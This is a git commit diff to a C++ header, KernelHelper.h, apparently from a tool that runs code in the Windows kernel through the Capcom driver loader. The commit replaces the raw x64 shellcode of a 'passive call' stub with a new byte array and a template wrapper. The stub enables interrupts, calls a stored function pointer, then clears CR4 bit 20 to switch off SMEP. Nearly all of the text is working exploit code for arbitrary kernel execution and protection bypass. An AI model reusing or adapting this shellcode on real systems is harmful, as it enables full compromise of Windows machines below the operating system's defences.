16e127e1b5fbc126afd98a068f73aa6b75ef01a1
Can Bölük <can.boluk89@gmail.com>
2018-04-29 00:41:02 +0300

    Added support for > 3 args in passive call stub.

--- KernelHelper.h
+++ KernelHelper.h
@@ -3,39 +3,44 @@
 #include "LockedMemory.h"
 #include "CapcomLoader.h"
 
-// 3 args max! If you need more args, change the shell code
-using fnPassiveCall = uint64_t( *)( PVOID Function, ... );
+// Not thread safe!
+using fnPassiveCall = uint64_t( *)( ... );
 
 NON_PAGED_DATA static fnFreeCall Khk_ExAllocatePool = 0;
-NON_PAGED_DATA static fnPassiveCall Khk_PassiveCall = 0;
+NON_PAGED_DATA static fnPassiveCall Khk_PassiveCallStub = 0;
+
+static const uint32_t Kh_PassiveCallStubCallStoreOffset = 0x2F;
+NON_PAGED_DATA static UCHAR Kh_PassiveCallStubData[] =
+{
+	0xFB,											// sti
+	0x8F, 0x05, 0x20, 0x00, 0x00, 0x00,				// pop [ret_store]
+	0x48, 0x8D, 0x05, 0x07, 0x00, 0x00, 0x00,		// lea rax, [continue]
+	0x50,											// push rax
+	0xFF, 0x25, 0x1A, 0x00, 0x00, 0x00,				// jmp [call_store] (stub+0x2F)
+	0xFA,											// cli
+	0x0F, 0x20, 0xE1,								// mov rcx, cr4
+	0x48, 0x0F, 0xBA, 0xF1, 0x14,					// btr rcx, 0x14
+	0x0F, 0x22, 0xE1,								// mov cr4, rcx
+	0xFF, 0x25, 0x00, 0x00, 0x00, 0x00,				// jmp [ret_store]
+	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	// ret_store:  dq 0
+	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	// call_store: dq 0
+};
+
 
 // This function is the only _TRICKY_ part of this project.
 // ExAllocatePool does not require interrupts to be enabled WHEN the size is small and we are depending on that.
 NON_PAGED_CODE static void Khk_AllocatePassiveStub()
 {
-	NON_PAGED_DATA static UCHAR Kh_PassiveCallStub[] = 
-	{
-		0x55,									// push   rbp
-		0x48, 0x89, 0xE5,						// mov    rbp,rsp
-		0x48, 0x83, 0xEC, 0x30, 				// sub    rsp,0x30
-		0xFB, 									// sti
-		0x48, 0x89, 0xC8, 						// mov    rax,rcx
-		0x48, 0x89, 0xD1, 						// mov    rcx,rdx
-		0x4C, 0x89, 0xC2, 						// mov    rdx,r8
-		0x4D, 0x89, 0xC8, 						// mov    r8,r9
-		0xFF, 0xD0, 							// call   rax
-		0xFA, 									// cli
-		0x0F, 0x20, 0xE1, 						// mov    rcx,cr4
-		0x48, 0x0F, 0xBA, 0xF1, 0x14, 			// btr    rcx,0x14
-		0x0F, 0x22, 0xE1, 						// mov    cr4,rcx
-		0x48, 0x89, 0xEC, 						// mov    rsp,rbp
-		0x5D, 									// pop    rbp
-		0xC3 									// ret
-	};
+	PVOID Out = ( PVOID ) Khk_ExAllocatePool( 0ull, sizeof( Kh_PassiveCallStubData ) );
+	Np_memcpy( Out, Kh_PassiveCallStubData, sizeof( Kh_PassiveCallStubData ) );
+	Khk_PassiveCallStub = ( fnPassiveCall ) Out;
+}
 
-	PVOID Out = ( PVOID ) Khk_ExAllocatePool( 0ull, sizeof( Kh_PassiveCallStub ) );
-	Np_memcpy( Out, Kh_PassiveCallStub, sizeof( Kh_PassiveCallStub ) );
-	Khk_PassiveCall = ( fnPassiveCall ) Out;
+template<typename ...Params>
+NON_PAGED_CODE static uint64_t Khk_CallPassive( PVOID Ptr, Params &&... params )
+{
+	*( PVOID* ) ( ( ( PUCHAR ) Khk_PassiveCallStub ) + Kh_PassiveCallStubCallStoreOffset ) = Ptr;
+	return Khk_PassiveCallStub( std::forward<Params>( params ) ... );
 }
 
 static void Khu_Init( CapcomContext* CpCtx, KernelContext* KrCtx )
